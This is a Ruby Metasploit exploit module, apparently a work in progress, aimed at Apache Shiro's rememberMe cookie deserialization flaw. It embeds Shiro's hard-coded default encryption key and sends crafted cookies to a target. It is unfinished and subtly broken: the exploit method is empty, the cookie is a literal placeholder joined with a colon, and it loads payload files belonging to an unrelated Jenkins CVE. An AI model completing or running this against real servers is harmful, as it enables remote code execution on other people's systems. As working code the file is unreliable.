##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# borrows code from jenkins_java_deserialize.rb
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpClient


  def initialize(info={})
    super(update_info(info,
                      'Name'           => "Apache Shiro rememberMe deserialize exploit",
                      'Description'    => %q{
        Leverages a hard coded default encryption key in the rememberMe functionality to expose a Commons Collections
        deserialization vulnerability.
      },
                      'License'        => MSF_LICENSE,
                      'Author'         => [ 'Vegard Vaage' ],
                      'References'     =>
                          [
                              [ 'URL', '' ]
                          ],
                      'Platform'       => 'java',
                      'Arch'           => ARCH_JAVA,
                      'Targets'        =>
                          [
                              [ 'Apache Shiro', { 'Ret' => 0x41414141 } ]
                          ],
                      'Payload'        =>
                          {
                              'BadChars' => "\x00"
                          },
                      'Privileged'     => false,
                      'DisclosureDate' => "",
                      'DefaultTarget'  => 0))

    register_options([
                         OptString.new('KEY', [false, 'The encryption key to use when decrypting the cookie, in base64', 'kPH+bIxk5D2deZiIxcaaaA==']),
                         OptString.new('COOKIE_NAME', [false, 'rememberMe cookie name', 'rememberMe']),
                         OptString.new('TARGETURI', [true, 'The base path', '/'])

                     ], self.class)
  end



  def exploit
    # Main function

  end


  def send_bad_cookie(opts)
    uri = target_uri.path
    cookieName = datastore['COOKIE_NAME']
    res = send_request_cgi({
                               'method'   => 'GET',
                               'uri'      => normalize_uri(uri),
                               'cookie' => cookieName + ':' + 'encryptedCookie'
                           })

    if res && res.code == 200
      print_good("I got a 200, awesome")
    else
      print_error("No 200, feeling blue")
    end
  end


  def read_bin_file(bin_file_path)
    data = ''

    File.open(File.join( Msf::Config.data_directory, "exploits", "CVE-2015-8103", bin_file_path ), 'rb') do |f|
      data = f.read
    end

    data
  end

end